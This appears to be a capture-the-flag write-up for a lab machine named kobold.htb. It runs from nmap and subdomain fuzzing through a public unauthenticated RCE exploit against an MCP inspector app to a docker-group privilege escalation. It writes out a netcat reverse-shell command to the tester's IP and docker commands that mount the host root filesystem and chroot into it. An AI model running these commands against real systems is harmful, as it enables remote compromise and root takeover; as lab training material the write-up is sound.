### Nmap 
```
nmap -sV -sC -vv 10.129.18.2

---OUTPUT---
Nmap scan report for 10.129.18.3
Host is up, received echo-reply ttl 63 (0.014s latency).
Scanned at 2026-03-26 08:43:06 EDT for 16s
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDyfTq7atQNY2qg78Nt+Q/rowZnmsZ0+vG+FraL750n57MCUNo0a/hw/Df2XfLKPUGiVIVYmQTraVft8Xv2AjYk=
|   256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHDfvijaU/WiU8D/im7cOg8k4NeAOUgCHq16HhCbmZcI
80/tcp  open  http     syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Issuer: commonName=kobold.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-15T15:08:55
| Not valid after:  2125-02-19T15:08:55
| MD5:     c49e c4d5 d4a0 e473 00bc 8df8 cc00 98ac
| SHA-1:   a231 1d00 d15b 2007 eff5 957d 0561 265a bb90 6906
| SHA-256: 0395 2d40 2b1f 2245 6092 f007 1ae7 6c6d 34d9 0ae3 c04f 271d db92 8907 e4e3 acfe
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhqgAwIBAgIUYYWyqxUgK9B/KXzRH5Qhz8UlYxkwDQYJKoZIhvcNAQEL
| BQAwFTETMBEGA1UEAwwKa29ib2xkLmh0YjAgFw0yNjAzMTUxNTA4NTVaGA8yMTI1
| MDIxOTE1MDg1NVowFTETMBEGA1UEAwwKa29ib2xkLmh0YjCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAJ8HVhVl45uBJYRwEQCmzAEXGqJMK6Wp5BOeaSLD
| 6KJjuSnWLOs5vKTtpHvhlulpnwqa7PmTiUUhjY421T2sn2KNRcCFKyNMJ9Ju6lSe
| ijY6oQ2DEED82QC/1HX6O2XtJUf5JWrGrr1krrS6wrHSrEaTwA0vgwrJlVf/TO+U
| 21Mnv3W1lActy7GMfnehOrz0zWDfYjNB/JuOWHEZdRIDALUicaMUgsReZDmBaLH7
| qMBBS7Eid9a15YNIU0FQ297ufai42rD2rDAndGG+eh6eri6DYMVmffBecbOsh4fv
| Li4PTXk3dvO+7+Fnx8YHCYtGTEv1k/R6o/+xQXLsGboQ5P0CAwEAAaN4MHYwHQYD
| VR0OBBYEFGFtHfv+9EMzqZuSryruA41VtTAZMB8GA1UdIwQYMBaAFGFtHfv+9EMz
| qZuSryruA41VtTAZMA8GA1UdEwEB/wQFMAMBAf8wIwYDVR0RBBwwGoIKa29ib2xk
| Lmh0YoIMKi5rb2JvbGQuaHRiMA0GCSqGSIb3DQEBCwUAA4IBAQCQybOVM+Zo5MTb
| QY/24rWy1ksAuiUqPHCABNprilPvsvBGkIMC6aSLqzR8UXm+4aQzBxNlHsePvkzu
| suuQKAoyCbnId0qii6a1vzeozgIOt+1oqfxFe7mRAiLhboSctFqScC6dy/PDEIOg
| bt+gLfU5iKsjqTQBxcWZr4uj7DtWbRC73OITWSSi/Y/AI66o5VHIUhnJ29gOEJVw
| 5Bv43Iublt2FBH/S6fiz509tJAsqLhp1kmxIAWrV92rBZPSpF4s2xWRbWefZPm7L
| fstlVNlXRrBnPz8iN8JrlpZLmZCUQ+BjMUXjqS27LS9Dl/3agD/F2gNuSho/s1F8
| TI93TWcE
|_-----END CERTIFICATE-----
|_http-title: Did not follow redirect to https://kobold.htb/
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[Pasted image 20260326084618.png]]

- With ffuf I find 2 other sublinks: `bin.kobold.htb` and `mcp.kobold.htb` for https:
```
ffuf -u https://kobold.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt   -H "Host:FUZZ.kobold.htb" -fs 154

---OUTPUT---

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://kobold.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Header           : Host: FUZZ.kobold.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 91ms]
mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 76ms]
:: Progress: [20481/20481] :: Job [1/1] :: 2083 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

#### bin.kobold.htb
![[Pasted image 20260326085834.png]]

#### mcp.kobold.htb
![[Pasted image 20260326085921.png]]

- When trying to log in I receive the following error:
![[Pasted image 20260326090058.png]]

- Checking settings I see the app version:
![[Pasted image 20260326093538.png]]

- Looking online I find an exploit: https://github.com/fckoo/mcpjaminspector-unauth-rce
- Using this exploit I get a reverse shell:
```
python3 exploit.py --target https://mcp.kobold.htb --command "busybox nc 10.10.17.206 9999 -e /bin/bash"   

---OUTPUT---             
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'mcp.kobold.htb'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
{"success":false,"error":"Connection failed for server exploit: MCP error -32001: Request timed out","details":"MCP error -32001: Request timed out"}
```
![[Pasted image 20260326093638.png]]

- I grab the user flag:
![[Pasted image 20260326093704.png]]

### Privilege Escalation

- Looking at IP address I see I am in a docker container.
- Furthermore looking at my id I am part of the operator group:
![[Pasted image 20260326095402.png]]

-  ***Generally if we are part of the docker group we can create docker containers. Using this we could mount the host root directory into a container to escape  as root***
	- But we are in operator group
![[Pasted image 20260326095749.png]]
- We try to change group to docker via the `newgrp` command and it does not ask us for a password (iplying that this account was created with the docker group and so it implicitly accepts the user into the group
- Now we can start a container with the root folder mounted on to it.

- looking at docker images available:
![[Pasted image 20260326095924.png]]

- I can then run the following exploit on the latest image (the other one runs as `nobody`) to grab the root flag:
```
docker run -v /:/mnt --rm mysql sh -c "cp /mnt/root/root.txt /mnt/tmp/flag.txt && chmod 777 /mnt/tmp/flag.txt"
```
- I can then read the flag:
![[Pasted image 20260326101116.png]]


- Alternatively I can pass:
```
docker run -v /:/mnt --rm -it mysql chroot /mnt bash
```
![[Pasted image 20260326101256.png]]

- I grab the root flag:
![[Pasted image 20260326101349.png]]